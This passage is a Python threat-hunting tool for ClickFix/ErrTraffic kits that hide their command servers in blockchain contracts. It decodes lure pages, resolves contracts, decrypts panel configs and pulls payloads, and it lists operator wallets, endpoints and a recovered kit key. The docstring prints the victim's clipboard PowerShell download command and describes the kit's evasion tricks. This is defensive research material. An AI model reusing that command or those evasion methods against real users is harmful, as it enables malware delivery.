#!/usr/bin/env python3
"""
ClickChain  v4.5  —  the ClickFix / ErrTraffic / ClearFake EtherHiding hunter.
(formerly decloak.py, then EtherHound)

A chain-of-evidence tool for EtherHiding-backed ClickFix kits: extracts the
blockchain-C2 loader from obfuscated lure pages, names the kit, decrypts the
panel's live encrypted config envelopes, and connects lure → contract → panel
→ payload → operator wallet in one command. Built first for hunting LenAI's
ErrTraffic / Aeternum kit family — including their May-2026 "BW v2" generation
(AES-256-GCM envelopes, uj/rlm URL param schema) — and adjacent EtherHiding
campaigns (ClearFake, UNC5142/CLEARSHORT, UNC5342/DPRK).

CAPABILITIES
============
1.  STATIC DECODE — peel obfuscated loader JS WITHOUT executing it.
    6 schemes (BW-v2 IIFE-wrapped XOR decoder, atob+byte-transform via
    sub-table / arithmetic / XOR / rolling-key, UTF-8 round-trip,
    reversed-atob, charcode arrays, hex-escape blobs) run through a
    sandboxed Python AST evaluator. 7 classifiers fire on the recovered
    text: EtherHiding loader, clipboard PS, AES kit, BW v2 plaintext
    launcher, PowerShell command, TDS beacon, anti-analysis gate.

2.  ROLE AUTO-DETECT — `classify_input_role` probes /api/index.php?a=init
    to decide whether the input is a LURE (compromised site running the
    loader) or a PANEL (the ErrTraffic C2 itself). Routes the comprehensive
    flow accordingly.

3.  ON-CHAIN RESOLVE  (--resolve) — passive read-only `eth_call` to the
    documented RPC pool, decode the contract return as the current C2 URL.
    Supports both v3 original `getURL()` (selector 0x38bcdc1c) and the
    Aeternum-pattern `getDomain()` (selector 0xb68d1809) used by the BW v2
    panel-router contracts.

4.  CONTRACT INVESTIGATE  (--investigate-contract ADDR) — pull current
    state, bytecode selectors (PUSH4 dispatch scan), recent setURL
    transaction history → complete C2 rotation timeline.

4b. CONTRACT TRIAGE  (--triage-contracts FILE) — fast state-only probe
    of many candidate contracts. ONE batched JSON-RPC round-trip per
    address (eth_getCode + admin + owner + getURL + url). Decodes each
    return, cross-refs admin/owner against KNOWN_ACTORS, and emits a
    summary headed by "DISTINCT admin wallets across the set" — the
    direct answer to "is this a 1-operator-N-contracts deployment or
    an N-customer ecosystem?" No history scan; ~100 ms / contract.

5.  COMPREHENSIVE (--comprehensive) — single-IOC full pipeline. In LURE mode:
    fetch + decode + classify + on-chain resolve + dual server fingerprint
    + WP + CF detect + mu-plugins backdoor probe (per LevelBlue 2026) +
    AES clipboard recovery + (optional) per-OS payload download. In PANEL
    mode: skip lure decode, probe + AES-256-GCM-decrypt the /api/cfg and
    /api/settings envelopes (yielding the operator's live mode/enabled/
    blockBots/rentalExpired config in plaintext), then go straight to
    /api/index.php?a=init for each OS.

6.  PAYLOAD DOWNLOAD (--payload) — 5-strategy chain for each OS:
        (0) known-token /api/index.php?a=dl  (from --payload-token or AES recovery)
        (1) v3 admin mint /index.php?action=generateDownloadToken     (per Censys)
        (2) v2 admin mint /api/generate-download-token.php           (legacy)
        (3) v3 runtime init→AES→dl   (the v3 original / lenders.digital era flow)
        (4) v3 BW v2 init→dl?uj=     (the BW v2 generation / slndcdnclaud.beer era flow)
    Saves binary + raw clipboard PS + decrypted dropper PS side-by-side with
    defanged `.bin` / `.clipboard.ps1` / `.decoded.ps1` suffixes.

7.  ENVELOPE DECRYPT — `decrypt_api_envelope()` ports the kit's own
    `decryptApiEnvelope()` JS function to Python. Implements both:
        gcm1 mode  (modern, AES-256-GCM, scope-keyed: sha256(K || scope+"|gcm1"))
        q2 mode    (legacy, RC4 with key = baseKey || nonce)
    Prefers pycryptodome / cryptography if installed; falls back to a
    vendored pure-Python AES-GCM (NIST SP 800-38D compliant, KAT-verified)
    + RC4. The kit-author's documented API_Q2_KEY_HEX is preloaded.

8.  BATCH — accept a single domain/URL or a file of newline-separated
    targets (defanged or not), fetch concurrently, emit results to
    text/JSON/JSONL/CSV simultaneously. Built to run on 4,000+ domains.

9.  --dump DIR — DEBUG mode: writes every raw artifact (lure HTML, init JSON,
    AES PS, decrypted PS, recovered binary, role-probe response, full
    per-strategy diagnostics) into DIR for offline analysis.

CTI LANDSCAPE THIS TOOL UNDERSTANDS  (current as of May 2026)
==============================================================
ErrTraffic kit timeline (advertised by LenAI on cybercrime forum, $800 USD):
  - v1 (late 2025): GlitchFix / CrashFix themes, plain HTTP staging
  - v2 (Dec 2025-Jan 2026): "ErrTraffic v2.Panel"; Browser Update / Font
    Missing / ClickFix / BSOD themes; still hardcoded panel domains
  - v3 (Feb 1 2026 →): EtherHiding adoption. Polygon mainnet smart contracts
    hold the current C2 URL; loader calls getURL() via eth_call. Operator
    rotates without touching compromised sites.
  - v3 BW v2 generation (May 2026 →): JavaScript codebase bumped — kit
    internal marker `__BW_SCRIPT_INITIALIZED_V2__`, 10-theme MODE_FILE_MAP
    (browser/font/recaptcha/bsod/silent/cloudflare/cf_update/mac_recaptcha/
    mac_cloudflare/recaptcha_win_r — the last per Atos's Win+R-variant
    documentation), AES-256-GCM envelopes (`enc:"gcm1"`) on /api/cfg and
    /api/settings, URL param rename token→uj, src→rlm, mode→encoded-rlm.
    On-chain layer shifted to Aeternum-pattern getDomain() selector.
    Documented by LevelBlue SpiderLabs 2026; full crypto reverse-engineered
    from the kit's /api/css.js loader on 2026-05-27.

ErrTraffic v3 runtime victim flow (the chain --payload replicates):
  v3 ORIGINAL (lenders.digital era):
    1. Loader eth_calls getURL() on Polygon contract → C2 hostname
    2. Browser POSTs /api/index.php?a=init&os=<os>&src=<lure>&mode=cloudflare
    3. Panel returns {"ok":true,"token":"<AES-CBC PowerShell>"} — token is
       an AES-encrypted PS, written to victim clipboard, decoded locally
    4. Decrypted PS does /api/index.php?a=dl&token=<HEX> → binary
  v3 BW v2 (slndcdnclaud.beer era, current as of May 2026):
    1. Loader eth_calls getDomain() (Aeternum selector) → C2 hostname
    2. Loader GETs /api/cfg → AES-GCM envelope ← we decrypt this passively
    3. Browser GETs /api/index.php?a=init → {"token":"<sha256-hex>"} (plain)
    4. Plaintext clipboard PS: `Invoke-WebRequest -Uri '<panel>/api/dl?uj=<hex>&rlm=<b64>' …`
    5. Victim pastes → PS GET /api/index.php?a=dl&uj=...&rlm=... → binary

Adjacent EtherHiding-using campaigns:
  - UNC5142 / CLEARSHORT (Mandiant): BNB Smart Chain, 3-tier contracts
  - UNC5342 / "Contagious Interview" / DPRK (Mandiant Oct 2025)
  - Aeternum Loader (Ctrl-Alt-Int3l 2026): also LenAI-deployed, Polygon
  - ClearFake-on-BSC-testnet variant (LevelBlue)

SAFETY MODEL
============
Static decoding: NEVER runs attacker code. Sandboxed Python AST evaluator,
whitelisted int math only. Vendored pure-Python AES-CBC for clipboard recovery.

--url / --comprehensive: passive HTTP GET (urllib + Chrome-like UA). NO JS
        execution, no form submission. Your server logs your IP — run from
        a sandboxed / non-attributable network.

--resolve / --investigate-contract: passive read-only `eth_call` to PUBLIC
        RPC providers. The RPC sees you; the contract operator does NOT see
        who's reading.

--payload: DOES contact the attacker panel via /api/index.php?a=init and
        /api/index.php?a=dl. Saves bytes with `.bin` suffix (never executable
        extension). Compute SHA-256 for VirusTotal — never submits files.

ALL output URLs are defanged.

USAGE
-----
    # one URL or file or directory or stdin (auto-detected)
    clickchain.py <input>

    # comprehensive single-IOC investigation + payload pull
    clickchain.py compraway.com --comprehensive --payload --dump debug_dump/

    # use a manually-captured AES PS token from a FlareVM walk-through
    clickchain.py compraway.com --comprehensive --payload \\
               --payload-token <HEX> --payload-src compraway.com

    # point directly at a panel (auto-detected as PANEL role)
    clickchain.py lenders.digital --comprehensive --payload

    # batch a list of domains (defanged or not, with or without scheme)
    clickchain.py menlo-list.txt --workers 24 --out-csv menlo.csv

    # full kit:  fetch + on-chain resolve + JSON + CSV + text to stdout
    clickchain.py menlo-list.txt --resolve --out-json out.json --out-csv out.csv

    # investigate a contract's full C2 rotation history
    clickchain.py --investigate-contract 0x08207B087F61d7e95E441E15fd6d40BEfd6eD308
"""
from __future__ import annotations
import sys, os, re, json, ast, csv, base64, hashlib, argparse, html as _html, time
import urllib.request, urllib.error, ssl, datetime, threading, traceback
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Iterable

TOOL_NAME       = "ClickChain"
TOOL_VERSION    = "clickchain/4.5"
SCHEMA_VERSION  = 4

# Force UTF-8 stdout BEFORE argparse / any print runs (Windows cp1252 default
# will otherwise crash on em-dashes and box-drawing characters in the help text
# and the comprehensive renderer).
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass
DEFAULT_WORKERS = 16
DEFAULT_FETCH_TIMEOUT = 20
DEFAULT_RPC_TIMEOUT   = 15
DEFAULT_MAX_BYTES     = 4_000_000

# ============================================================================
# CTI : known-actor attribution table
# ============================================================================
# Keys are LOWERCASE addresses. Matched against contract_addresses from
# classified loaders AND against transaction-history controller wallets.
KNOWN_ACTORS: dict[str, dict] = {
    # ---- ErrTraffic v3 — LevelBlue / Trinity Cyber / Sekoia 2026 ------------
    # Live C2-holding contract (confirmed via getURL() = "comicstar.lat" as of
    # 2026-05-25). 2,451-byte bytecode; one of LenAI's 20+ deployed contracts.
    "0x08207b087f61d7e95e441e15fd6d40befd6ed308": {
        "kind":             "c2_contract",
        "name":             "ErrTraffic v3 — C2 holding contract",
        "kit":              "ErrTraffic v3",
        "advertised_as":    "LenAI on cybercrime forum (Jan 2026)",
        "chain":            "polygon",
        "selectors":        {"0x38bcdc1c": "getURL()", "0x77343408": "setURL(string)"},
        "infra":            "Omegatech LTD AS202412 + Polygon mainnet (gas ~$0.001 per rotation)",
        "registrar":        "Dynadot LLC, burner TLDs (.beer .lat .sbs .cfd .lol .bond .cyou)",
        "downstream":       "ClickFix fake-Cloudflare CAPTCHA -> PowerShell AES wave",
        "victims":          "compromised WordPress sites with PHP backdoor in mu-plugins/",
        "confidence":       "high",
        "first_seen":       "2026-03-11",
        "sources":          ["LevelBlue SpiderLabs 2026", "Trinity Cyber 2026", "Sekoia 2026"],
    },
    # LenAI's primary deployer wallet — has created 20+ ErrTraffic / Aeternum
    # contracts on Polygon since Jan 31 2026 (per LevelBlue).
    "0xcaf2c54e400437da717cf215181b170f65187abf": {
        "kind":          "deployer_wallet",
        "name":          "LenAI — primary deployer wallet",
        "kit":           "ErrTraffic / Aeternum",
        "chain":         "polygon",
        "first_seen":    "2026-01-31",
        "confidence":    "high",
        "note":          "20+ child contracts deployed; also seen calling 'Update Domain' on Aeternum 0x4d70C3...",
        "sources":       ["LevelBlue SpiderLabs 2026", "Ctrl-Alt-Int3l 2026"],
    },
    # The operator-controller wallet that issues setURL() to 0x08207B...
    # Verified two ways: (a) every setURL tx is from this address, (b) calling
    # admin() on the contract returns this exact address. Cryptographic-grade
    # attribution: the contract publicly tells you who its owner is.
    "0x34c15320d6e8f59f1b66f6c191aaa7f87b894b66": {
        "kind":          "controller_wallet",
        "name":          "ErrTraffic v3 — operator-controller wallet for 0x08207B...",
        "kit":           "ErrTraffic v3",
        "chain":         "polygon",
        "confidence":    "high",
        "note":          ("88+ setURL(string) transactions to 0x08207B... — rotation cadence "
                          "averages 1-3 days. URL history publicly readable from chain. "
                          "Independently verified via admin() == this address."),
        "sources":       ["clickchain.py contract-history + admin() verification 2026-05-26"],
    },
    # Aeternum Loader contract — same family / same deployer (LenAI 0xcaf2…7abf)
    "0x4d70c3393c5d9ec325edf8b3f289cfa9777e64b0": {
        "kind":          "c2_contract",
        "name":          "Aeternum Loader — C2 holding contract",
        "kit":           "Aeternum (LenAI family)",
        "chain":         "polygon",
        "selectors":     {"0xb68d1809": "getDomain()"},
        "confidence":    "high",
        "note":          ("13+ 'Update Domain' tx, all from LenAI deployer 0xcaf2…7abf. "
                          "Similar single-string-state pattern as ErrTraffic v3 C2 contracts."),
        "sources":       ["Ctrl-Alt-Int3l 2026", "The Hacker News Aeternum 2026-02"],
    },
    # LenAI secondary deployer/operator wallet — per Ctrl-Alt-Int3l Aeternum Part 2.
    "0x6e3c232c3c61dfce05e677cc351b3d0d677ee49b": {
        "kind":          "deployer_wallet",
        "name":          "LenAI — secondary deployer wallet",
        "kit":           "ErrTraffic / Aeternum",
        "chain":         "polygon",
        "confidence":    "high",
        "note":          ("Listed alongside 0xcaf2…7abf as a LenAI-controlled wallet. "
                          "Use as a cross-reference seed for additional deployments."),
        "sources":       ["Ctrl-Alt-Int3l Aeternum Part 2 (2026)"],
    },
    # ErrTraffic v3 (BW v2 generation) — fresh contract using Aeternum's getDomain()
    # selector pattern. Confirmed live via chain query 2026-05-27:
    #   getDomain() -> "https://slndcdnclaud.beer"  (plaintext UTF-8, no XOR/GCM)
    #   admin()     -> 0xb0425bf235a2275735c8c5d668aa0273c65970b9  (operator wallet)
    # The panel at slndcdnclaud.beer runs the documented ErrTraffic v3 kit in its
    # BW v2 JavaScript generation (__BW_SCRIPT_INITIALIZED_V2__ marker, gcm1
    # envelope, 10-mode MODE_FILE_MAP catalog). NOT a new kit — a fresh deployment
    # of LenAI's existing ErrTraffic v3 codebase using Aeternum-style routing.
    "0x07b4ab119f16743effeba66ce1f23fc0346327f8": {
        "kind":          "c2_contract",
        "name":          "ErrTraffic v3 (BW v2 generation) — panel-router contract",
        "kit":           "ErrTraffic v3 (BW v2 generation)",
        "chain":         "polygon",
        "selectors":     {"0xb68d1809": "getDomain()", "0xf851a440": "admin()"},
        "confidence":    "high",
        "first_seen":    "2026-05-27 (clickchain.py chain probe)",
        "note":          ("getDomain() returns 'https://slndcdnclaud.beer' in PLAINTEXT — "
                          "uses Aeternum's b68d1809 selector pattern but with the ErrTraffic "
                          "v3 (BW v2) panel kit behind it. The panel exposes /api/index.php "
                          "?a=init|cfg|dl|evt and uses the gcm1 (AES-256-GCM) envelope per "
                          "LevelBlue SpiderLabs 2026. Operator wallet (admin()) is "
                          "0xb0425bf235...65970b9 — not in any prior public CTI we found."),
        "sources":       ["clickchain.py chain probe 2026-05-27",
                          "LevelBlue SpiderLabs ErrTraffic v3 2026",
                          "Ctrl-Alt-Int3l Aeternum 2026"],
    },
    # The operator-controller wallet behind the slndcdnclaud.beer panel.
    # Verified via admin() on contract 0x07b4ab...327f8.  No prior public CTI.
    "0xb0425bf235a2275735c8c5d668aa0273c65970b9": {
        "kind":          "controller_wallet",
        "name":          "ErrTraffic v3 (BW v2) — operator-controller wallet for 0x07b4aB...",
        "kit":           "ErrTraffic v3 (BW v2 generation)",
        "chain":         "polygon",
        "confidence":    "high",
        "note":          ("admin() of 0x07b4aB119F...327F8 returns this address. "
                          "Independently chain-verified ownership. NOT documented in any "
                          "public CTI as of 2026-05-27 — novel pivot."),
        "sources":       ["clickchain.py admin() verification 2026-05-27"],
    },
    # ---- ClearFake on BSC testnet (LevelBlue 2026) -------------------------
    "0xa1decfb75c8c0ca28c10517ce56b710baf727d2e": {
        "kind": "c2_contract", "name": "ClearFake (BSC testnet, validation contract)",
        "kit": "ClearFake", "chain": "bsc-testnet",
        "confidence": "high", "sources": ["LevelBlue SpiderLabs 2026"],
    },
    "0x46790e2ac7f3ca5a7d1bfce312d11e91d23383ff": {
        "kind": "c2_contract", "name": "ClearFake (BSC testnet, Windows payload contract)",
        "kit": "ClearFake", "chain": "bsc-testnet",
        "confidence": "high", "sources": ["LevelBlue SpiderLabs 2026"],
    },
    "0x68dce15c1002a2689e19d33a3ae509dd1feb11a5": {
        "kind": "c2_contract", "name": "ClearFake (BSC testnet, macOS payload contract)",
        "kit": "ClearFake", "chain": "bsc-testnet",
        "confidence": "high", "sources": ["LevelBlue SpiderLabs 2026"],
    },
    "0xf4a32588b50a59a82fba148d436081a48d80832a": {
        "kind": "c2_contract", "name": "ClearFake (BSC testnet, UUID-dedup contract)",
        "kit": "ClearFake", "chain": "bsc-testnet",
        "confidence": "high", "sources": ["LevelBlue SpiderLabs 2026"],
    },
}

# ============================================================================
# CTI : known function selectors (4-byte keccak256 prefixes)
# ============================================================================
# Decode-strategy semantics:
#   "string"     -> ABI-encoded string (offset + length + utf8 bytes)
#   "string_lax" -> ErrTraffic's loader-side decoder (drops null bytes, trims)
KNOWN_SELECTORS: dict[str, dict] = {
    "0x38bcdc1c": {
        "signature": "getURL()",                 # read
        "returns":   "string_lax",
        "context":   "ErrTraffic v3 — loader fetches current C2 URL",
        "sources":   ["LevelBlue 2026"],
    },
    "0x77343408": {
        "signature": "setURL(string)",           # write
        "param":     "string",
        "context":   "ErrTraffic v3 — operator rotates the staged URL",
        "sources":   ["clickchain.py chain inspection 2026-05-26"],
    },
    "0x5600f04f": {
        "signature": "url()",                    # read — Solidity auto-getter
        "returns":   "string_lax",
        "context":   "ErrTraffic v3 — same as getURL() (auto-generated public getter for state var `url`)",
        "sources":   ["4byte.directory", "clickchain.py bytecode introspection 2026-05-26"],
    },
    "0xf851a440": {
        "signature": "admin()",                  # read — Solidity auto-getter
        "returns":   "address",
        "context":   ("ErrTraffic v3 — auto-generated getter for state var `admin`; returns the "
                      "operator-controller wallet. Defender goldmine: independent ownership proof."),
        "sources":   ["4byte.directory", "clickchain.py admin() verification 2026-05-26"],
    },
    # placeholders for unknown owner-management style selectors we may encounter
    "0x8da5cb5b": {
        "signature": "owner()",
        "returns":   "address",
        "context":   "Solidity Ownable owner() — common in C2 contracts (not yet observed in ErrTraffic)",
        "sources":   ["4byte.directory"],
    },
    "0xf2fde38b": {
        "signature": "transferOwnership(address)",
        "param":     "address",
        "context":   "Solidity Ownable ownership-transfer — would indicate operator-handoff if observed",
        "sources":   ["4byte.directory"],
    },
    # Aeternum-pattern domain getter — used by both Aeternum (0x4d70C3…) and the
    # ErrTraffic v3 (BW v2 generation) panel-router contracts (0x07b4aB… and
    # presumably others by the same operator). Return value is plain UTF-8 in
    # the observed ErrTraffic-v3-via-Aeternum case; the Aeternum loader binary
    # additionally AES-GCM-decrypts (PBKDF2-HMAC-SHA256 100k iter) its return.
    "0xb68d1809": {
        "signature": "getDomain()",
        "returns":   "string_lax",
        "context":   ("Aeternum-family domain getter. Plain UTF-8 in ErrTraffic v3 (BW v2) "
                      "panel-router contracts; AES-256-GCM-encrypted in original Aeternum "
                      "loader binary per Ctrl-Alt-Int3l 2026."),
        "sources":   ["Ctrl-Alt-Int3l 2026", "clickchain.py chain probe 2026-05-27"],
    },
    "0x41c0e1b5": {
        "signature": "kill()",
        "returns":   "void",
        "context":   "Self-destruct — observed on a small fraction of Aeternum-pattern contracts.",
        "sources":   ["4byte.directory"],
    },
    "0x4fb2e45d": {
        "signature": "transferOwner(address)",
        "param":     "address",
        "context":   "Non-standard ownership-transfer — observed on some Aeternum-pattern contracts.",
        "sources":   ["4byte.directory"],
    },
}

# ============================================================================
# CTI : ErrTraffic kit catalog (v2 + v3 panel endpoints, OS targets, cookies,
# geofence, bot blocklist, mode values, XOR keys)
# ============================================================================
ERRTRAFFIC_KIT = {
    # v3 (Feb 2026+, Polygon EtherHiding era)
    # NOTE: TWO distinct endpoint families live on a v3 panel:
    #  (a) Runtime victim flow — under /api/index.php with SHORT action `a=`.
    #      Token is server-issued and embedded into the AES-encrypted clipboard
    #      blob; the PowerShell that the victim pastes fetches /api/index.php?a=dl
    #      with that token. (Per LevelBlue 2026 + observed wild samples.)
    #  (b) Operator/admin-style mint flow — under /index.php (NO /api/ prefix)
    #      with LONG action `action=generateDownloadToken` / `action=download`.
    #      This is what Censys' standalone payload downloader script targets.
    "panel_endpoints_v3_runtime": {           # victim browser → /api/index.php?a=...
        # Both response shapes observed in the wild:
        #   v3 original (AES-CBC clipboard wrap):    {"ok":true,"token":"<AES PS>"}
        #   v3 BW v2 generation (May 2026+):         {"token":"<hex64>"}
        "init":      "/api/index.php?a=init",
        # Returns encrypted envelope {"enc":"gcm1","q":"<b64url>"}  OR  {"enc":"q2","q":"<b64url>"}
        # Decrypt via decrypt_api_envelope() with scope="cfg".
        "cfg":       "/api/index.php?a=cfg",
        # Same response shape as cfg in BW v2 (some deployments use this alias).
        "settings":  "/api/index.php?a=settings",
        # Telemetry / page-view beacon (POST-only on BW v2; GET returns 405).
        "evt":       "/api/index.php?a=evt",
        # Download — BW v2 accepts: token=, uj=, or t= (operator-renamed aliases).
        "dl":        "/api/index.php?a=dl",
        # External loader source (XOR-encoded, key in inline var; BW v2 ships here).
        "css_js":    "/api/css.js",
        # Legacy admin alias — kept for backward-compat with older v3 deployments.
        "settings_legacy":  "/api/index.php?action=settings",
    },
    "panel_endpoints_v3_admin": {             # operator/admin → /index.php?action=... (NO /api/)
        "gen_token": "/index.php?action=generateDownloadToken",  # ← was wrong (had /api/)
        "download":  "/index.php?action=download",                # ← was wrong (had /api/)
        "settings":  "/index.php?action=settings",
    },
    # v2 (Dec 2025 - Jan 2026, pre-Polygon)
    "panel_endpoints_v2": {
        "gen_token": "/api/generate-download-token.php",
        "download":  "/api/download.php",
        "css_js":    "/api/css.js.php",
        "log":       "/api/log.php",
    },
    # admin / install panel paths (often left exposed on misconfigured deployments)
    "admin_paths": [
        "/admin/login.php", "/admin/index.php", "/install.php",
        "/admin/partials/analytics.php", "/admin/partials/files.php",
        "/admin/partials/script.php", "/admin/partials/settings.php",
    ],
    "supported_os": ["windows", "mac", "android", "linux"],
    "modes":        ["cloudflare", "clickfix"],         # the `mode=` URL param value
    "src_values":   ["clickfix"],                        # the `src=` URL param value
    # cookies the kit sets on victims (used for dedup + state)
    "session_cookies": [
        "errtraffic_session",   # v2/v3 panel session
        "_cf_verified",          # v3 victim "served once" flag (mimics Cloudflare)
        "_wp_perf_ok",           # v3 victim "served once" flag (mimics WP perf plugin)
        "bw-downloaded",         # v3 localStorage download flag
    ],
    # CIS geofence — kit explicitly skips these (Russian-speaking operator
    # protecting their home market from prosecution)
    "geofence_cis":   ["BY","KZ","AM","AZ","KG","MD","TJ","TM","UZ","RU","UA"],
    # Bot UA blocklist (kit refuses to serve these)
    "bot_ua_block": ["googlebot","bingbot","yandexbot","semrushbot","ahrefsbot",
                     "headless","phantom","selenium","webdriver","playwright",
                     "puppeteer","lighthouse","pingdom","monitor","preview"],
    # Census-observed XOR keys in v3 loader variants
    "v3_xor_keys_seen": [141, 222, 242, 211, 161, 51, 71, 54, 241, 69],
    # Database table names (v2 schema documented by Censys)
    "v2_db_tables":  ["et_users","et_settings","et_files","et_download_tokens","et_events"],
    # Censys-discoverable signature (Set-Cookie header pattern)
    "censys_query":  'web.endpoints.http.headers: (key: "Set-Cookie" and value: "errtraffic_session=")',
    "advertised_at": "$800 (Russian-language cybercrime forum, Dec 2025)",

    # ── BW v2 generation (May 2026 deployments) ────────────────────────────────
    # ErrTraffic v3's JavaScript codebase has gone through generational bumps the
    # kit author labels internally as "BW v1" → "BW v2" (BW = BrowserWarning, per
    # the historical window.BrowserWarningConfig var). BW v2 is the current modern
    # generation observed on slndcdnclaud.beer and presumably across the broader
    # ErrTraffic v3 panel fleet as of May 2026.
    #
    # This is NOT a new kit (no "v4" exists in any public CTI). The on-the-wire
    # /api/index.php?a=… endpoints are unchanged; only the loader JS internals,
    # the URL param names, and the envelope-encryption scheme have evolved.
    "bw_v2": {
        # JavaScript-level identification markers (used by detect_errtraffic_version
        # and the BW v2 obfuscation matcher).
        "js_markers": [
            "__BW_SCRIPT_INITIALIZED__",     # original BW marker (Censys-documented)
            "__BW_SCRIPT_INITIALIZED_V2__",  # BW v2 generation marker (our find)
            "BW_CONFIG",                      # kit config var (Censys-documented)
            "__BW_CONTRACT_OVERRIDE",         # debug/override hook (kit-author dev path)
            "__bwDecryptApiEnvelope",         # window-exported helper for runtime decrypt
            "MODE_FILE_MAP",                  # theme catalog var
        ],
        # Storage keys the kit uses for victim deduplication.
        "storage_keys": {
            "primary":       "site_repair_state",   # BW v2 current primary
            "legacy":        "bw-downloaded",       # BW v1 legacy (kept for backward compat)
        },
        # The 10 lure-theme modes — `MODE_FILE_MAP` in the loader JS. Each maps
        # to a per-theme runtime file the panel serves.
        "mode_file_map": {
            "browser":          "v1.js",   # Browser Update theme
            "font":             "v2.js",   # System Font Missing theme
            "recaptcha":        "v3.js",   # Fake reCAPTCHA (classic ClickFix)
            "bsod":             "v4.js",   # BSOD theme
            "silent":           "v5.js",   # Silent / test mode (no display)
            "cloudflare":       "v6.js",   # Cloudflare "Verify you are human"
            "cf_update":        "v7.js",   # Cloudflare-themed update
            "mac_recaptcha":    "v8.js",   # macOS reCAPTCHA
            "mac_cloudflare":   "v9.js",   # macOS Cloudflare
            "recaptcha_win_r":  "v10.js",  # Windows-key+R variant (Atos-documented May 2026)
        },
        # API envelope encryption — the panel encrypts /api/cfg and /api/settings
        # responses (and signed requests) under one of two modes. Documented by
        # LevelBlue SpiderLabs 2026; full algorithm reverse-engineered from
        # /api/css.js loader extraction 2026-05-27.
        "envelope_modes": {
            # CURRENT (modern): AES-256-GCM with scope-keyed derivation.
            #   packed   = b64url_decode(obj.q)         [iv(12) || cipher_with_tag(N+16)]
            #   key      = sha256( hex_to_bytes(API_Q2_KEY_HEX) || utf8(scope + "|gcm1") )
            #   scope    = ∈ {"cfg","init","dl","evt"} (regex /^[a-z0-9_]{1,16}$/i, default "cfg")
            #   plain    = AES-GCM-decrypt(key, iv, cipher_with_tag, tag_length=128)
            "gcm1": {
                "algorithm":        "AES-256-GCM",
                "iv_bytes":         12,
                "tag_bits":         128,
                "key_derivation":   "sha256(API_Q2_KEY || utf8(scope + '|gcm1'))",
                "scope_pattern":    r'^[a-z0-9_]{1,16}$',
                "default_scope":    "cfg",
                "encoding":         "base64-url-safe (no padding)",
            },
            # LEGACY: RC4 with key = base_key || nonce  (kit's "q2" envelope).
            #   packed   = b64url_decode(obj.q  OR  obj.q2 fallback)
            #   nonce    = packed[0:8]
            #   ciphertext = packed[8:]
            #   keyMat   = base_key || nonce       (raw concat, NOT hashed)
            #   plain    = RC4(keyMat, ciphertext)
            "q2": {
                "algorithm":        "RC4",
                "nonce_bytes":      8,
                "key_derivation":   "base_key_bytes || nonce_bytes (raw concat)",
                "encoding":         "base64-url-safe (no padding)",
            },
        },
        # Panel endpoints with their envelope scope. The scope binds the derived
        # AES-GCM key (so cfg-key != init-key != dl-key != evt-key).
        "scopes": {
            "init":     "init",     # session init / token mint
            "cfg":      "cfg",      # latest config (encrypted)
            "settings": "cfg",      # alias used in some deployments
            "dl":       "dl",       # download token mint
            "evt":      "evt",      # telemetry event
        },
        # URL parameters seen across BW v2 deployments. We accept ANY of these
        # as the download-token alias; the kit author rotates aliases between
        # deployments to defeat signature-based detection.
        "token_param_aliases": [
            "token",   # original v3 name (lenders.digital era)
            "uj",      # BW v2 rename observed on slndcdnclaud.beer (2026-05-27)
            "t",       # short-form sometimes seen on /evt beacons
        ],
        # The lure-source / kit-mode binding param (was `src=`+`mode=` in v3
        # original; collapsed into `rlm=` on BW v2 — value is 4 base64-url bytes
        # encoding a small per-deploy ID).
        "src_param_aliases": ["src", "rlm"],
        # The encrypted-envelope payload field name (in JSON responses and in
        # ?q=... URL params for signed outgoing requests).
        "envelope_field":   "q",
        # Beacon (a=evt) parameter list — small abbreviated keys per LevelBlue.
        "beacon_params":    ["a","d","ip","r","m","u","l","dv","br","os","f","t"],
        # Default sample mode/src values to use when minting tokens.
        "default_src":      "clickfix",
        "default_mode":     "cloudflare",
    },
    # Recovered API_Q2_KEY_HEX values, indexed by panel host where observed.
    # The kit ships the key hardcoded in /api/css.js — same key across all panels
    # in a given kit-author build, until LenAI rotates the build. Multiple keys
    # may co-exist if the operator runs multiple panel fleets.
    "bw_v2_keys": {
        # Default — the literal key from /api/css.js on slndcdnclaud.beer
        # (extracted 2026-05-27 via static loader decode). Documented by LevelBlue
        # SpiderLabs as API_Q2_KEY_HEX (literal value redacted in their writeup).
        "API_Q2_KEY_HEX": "f41fc75b5a2d040901bfd6b038da14f4f4aa96f0cad59c4cc721c07c62efe3a2",
        # Per-host override map for when the operator rotates the key per fleet.
        "by_host": {
            "slndcdnclaud.beer": "f41fc75b5a2d040901bfd6b038da14f4f4aa96f0cad59c4cc721c07c62efe3a2",
        },
    },
}

# Distinct v2 vs v3 endpoint patterns -> version detection from a URL
def detect_errtraffic_version(url: str) -> str:
    """Given a recovered staging URL or panel endpoint, classify v2 vs v3.
    Returns one of: 'v2', 'v3', 'v3_bwv2', 'unknown'.

    The `v3_bwv2` tier identifies the May 2026+ BW v2 generation by the
    URL-level param-rename signature (uj=/rlm=). Use detect_errtraffic_generation
    for stronger detection against decoded loader text (which sees the JS markers).
    """
    u = url.lower()
    # BW v2 generation: any of the renamed URL params present
    if re.search(r'[?&](uj|rlm)=', u): return "v3_bwv2"
    if "index.php" in u and ("a=" in u or "action=" in u or "?q=" in u or "&q=" in u): return "v3"
    if "generate-download-token.php" in u or "download.php" in u or "/api/log.php" in u: return "v2"
    if "/api/css.js.php" in u: return "v2"
    if "/api/css.js" in u: return "v3"
    return "unknown"


def detect_errtraffic_generation(loader_text: str) -> dict:
    """Decide ErrTraffic v3 generation from the DECODED loader JS body.

    Looks for the BW v2 marker hierarchy + the gcm1/q2 envelope plumbing.
    Returns: {"generation": "bw_v1" | "bw_v2" | "v3_unknown",
              "markers_found": [str...],
              "confidence": float 0..1}
    """
    found = []
    bw_v2 = ERRTRAFFIC_KIT.get("bw_v2", {})
    text = loader_text or ""
    for m in bw_v2.get("js_markers", []):
        if m in text: found.append(m)
    # MODE_FILE_MAP entries (theme files v1.js..v10.js) — strong BW v2 signal
    mfm_hits = sum(1 for theme, fn in bw_v2.get("mode_file_map", {}).items()
                   if f"'{theme}'" in text or f'"{theme}"' in text or
                      f"'{fn}'" in text or f'"{fn}"' in text)
    if mfm_hits >= 4: found.append(f"MODE_FILE_MAP({mfm_hits}/10 themes seen)")
    # Envelope plumbing
    if "decryptApiEnvelope" in text:                    found.append("decryptApiEnvelope")
